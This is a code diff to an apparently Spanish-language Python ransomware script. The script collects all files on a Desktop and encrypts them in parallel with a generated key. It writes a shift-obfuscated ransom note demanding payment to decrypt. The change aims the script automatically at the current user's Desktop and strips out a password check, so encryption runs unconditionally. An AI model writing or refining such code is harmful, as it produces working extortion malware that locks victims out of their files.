@@ -47,7 +47,7 @@ def get_all_files_in_directory(dir_path):
     return files_list
 
 def main_encryption():
-    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
+    path_to_encrypt = os.path.expanduser('~/Desktop')  # Ahora obtiene automáticamente el directorio del usuario
     all_files = get_all_files_in_directory(path_to_encrypt)
 
     key = generar_key()
@@ -59,15 +59,8 @@ def main_encryption():
         file.write(desencriptar('Gjdifspft fodsjuqbept qps fm ujup Fsspejohfs\n'))
         file.write(desencriptar('Ebnf vo fvttdsjqujpo qbsb eftfodsjqubs. Uibolt'))
 
-    # Solicitar la contraseña al usuario
-    # root = tk.Tk()
-    # root.withdraw()
-    # password = simpledialog.askstring("Contraseña", "Introduce la contraseña para encriptar los archivos:", show='*')
-    # if password == "contraseña_correcta":
     with multiprocessing.Pool() as pool:
         pool.starmap(encrypt, [(file, key) for file in all_files])
-    # else:
-    #     print("Contraseña incorrecta.")
 
 if __name__ == '__main__':
     p1 = multiprocessing.Process(target=main_encryption)
